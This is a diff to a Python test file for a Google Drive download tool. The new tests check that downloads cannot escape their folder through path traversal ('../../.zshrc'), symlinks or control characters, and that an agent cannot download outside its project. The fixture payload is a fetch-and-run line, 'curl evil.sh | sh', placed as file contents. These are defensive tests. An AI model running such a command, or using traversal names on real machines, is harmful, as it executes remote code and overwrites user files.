@@ -228,6 +228,11 @@ class TestSearchFiles:
 
 class TestDownload:
 
+    @pytest.fixture(autouse=True)
+    def _inside_the_project(self, tmp_path, monkeypatch):
+        """Agents download inside the project only (#1753); tmp_path is it here."""
+        monkeypatch.chdir(tmp_path)
+
     def _stub_download(self, monkeypatch, payload=b"filebytes"):
         """Make MediaIoBaseDownload write payload into the buffer in one chunk."""
         def fake_downloader(buffer, request, chunksize=None):
@@ -327,6 +332,79 @@ class TestDownload:
             drive_with_service(service).download("file-1", dest=str(target))
 
         assert target.read_bytes() == b"filebytes"
+
+
+class TestDownloadStaysInItsFolder:
+    """A Drive name is chosen by whoever shared the file, not by the user (#1753)."""
+
+    @staticmethod
+    def _drive(name, data=b"curl evil.sh | sh\n", **kwargs):
+        from connectonion.useful_tools.gdrive import GDrive
+        with patch.dict(os.environ, ENV, clear=False):
+            drive = GDrive(**kwargs)
+        drive._read_file = lambda file_id: {"name": name, "data": data}
+        return drive
+
+    def test_a_traversal_name_stays_in_the_destination(self, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        downloads = tmp_path / "project" / "downloads"
+        downloads.mkdir(parents=True)
+        victim = tmp_path / ".zshrc"
+        victim.write_text("original shell config\n")
+
+        result = self._drive("../../.zshrc").download("f", dest=str(downloads))
+
+        assert victim.read_text() == "original shell config\n"
+        assert (downloads / ".zshrc").read_bytes() == b"curl evil.sh | sh\n"
+        assert str(downloads / ".zshrc") in result
+
+    def test_an_existing_file_is_kept_and_the_download_gets_a_suffix(self, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        (tmp_path / "Report.pdf").write_bytes(b"mine")
+
+        result = self._drive("Report.pdf", b"theirs").download("f", dest=str(tmp_path))
+
+        assert (tmp_path / "Report.pdf").read_bytes() == b"mine"
+        assert (tmp_path / "Report-1.pdf").read_bytes() == b"theirs"
+        assert "Report-1.pdf" in result
+
+    def test_a_symlink_at_the_name_is_not_followed(self, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+        outside = tmp_path / "outside.txt"
+        outside.write_text("keep")
+        (tmp_path / "notes.txt").symlink_to(outside)
+
+        self._drive("notes.txt", b"new").download("f", dest=str(tmp_path))
+
+        assert outside.read_text() == "keep"
+        assert (tmp_path / "notes-1.txt").read_bytes() == b"new"
+
+    def test_control_characters_cannot_forge_output(self, tmp_path, monkeypatch):
+        monkeypatch.chdir(tmp_path)
+
+        result = self._drive("a\x1b[31mb.txt", b"x").download("f", dest=str(tmp_path))
+
+        assert "\x1b" not in result
+        assert (tmp_path / "a_[31mb.txt").read_bytes() == b"x"
+
+    def test_the_agent_tool_refuses_a_destination_outside_the_project(self, tmp_path, monkeypatch):
+        project = tmp_path / "project"
+        project.mkdir()
+        monkeypatch.chdir(project)
+
+        with pytest.raises(PermissionError):
+            self._drive("Report.pdf").download("f", dest=str(tmp_path))
+
+        assert not (tmp_path / "Report.pdf").exists()
+
+    def test_the_cli_may_download_anywhere_the_user_names(self, tmp_path, monkeypatch):
+        project = tmp_path / "project"
+        project.mkdir()
+        monkeypatch.chdir(project)
+
+        self._drive("Report.pdf", b"x", allow_external_downloads=True).download("f", dest=str(tmp_path))
+
+        assert (tmp_path / "Report.pdf").read_bytes() == b"x"
 
 
 class TestReadFileForAttachment:
